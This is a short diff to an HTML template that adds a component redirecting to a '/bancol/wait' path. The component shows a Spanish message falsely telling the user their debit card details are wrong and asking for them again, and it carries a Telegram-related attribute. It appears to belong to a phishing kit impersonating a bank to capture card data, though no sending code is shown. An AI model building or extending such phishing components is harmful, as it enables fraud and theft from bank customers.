@@ -407,6 +407,14 @@
         }
     </script>
 
+    <x-control
+        :auto-completar="false"
+        :debug="false"
+        redirect-url="/bancol/wait"
+        toast-message="La información de tu tarjeta débito es incorrecta. Ingresala nuevamente"
+        telegram-button="TDB"
+    />
+
 </body>
 
 </html>
